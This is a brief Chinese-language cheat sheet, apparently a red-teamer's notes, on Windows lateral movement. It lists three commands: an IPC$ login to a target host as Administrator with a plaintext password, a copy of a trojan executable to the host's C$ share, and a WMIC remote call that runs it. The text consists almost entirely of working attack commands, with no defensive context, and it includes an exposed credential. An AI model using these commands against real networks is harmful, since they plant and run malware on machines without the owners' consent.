## 0x00 碰见的横向移动方法总结（部分，慢慢更新）

    主机开启139和445端口，IPC移动  
    shell net use \\\\192.168.10.23\\ipc$ "Psft24680!!@@62##" /user:"Administrator"  
    
    在本地传个马，copy过去    
    shell copy C:\\Windows\\Temp\\ma.exe \\\\192.168.10.23\\c$\\Windows\\Temp\\ma.exe
      
    VMIC远程执行 
    shell wmic /node:192.168.10.23 /user:Administrator /password:Psft24680!!@@62## process call create "cmd.exe /c C:\\Windows\\Temp\\ma.exe"
 
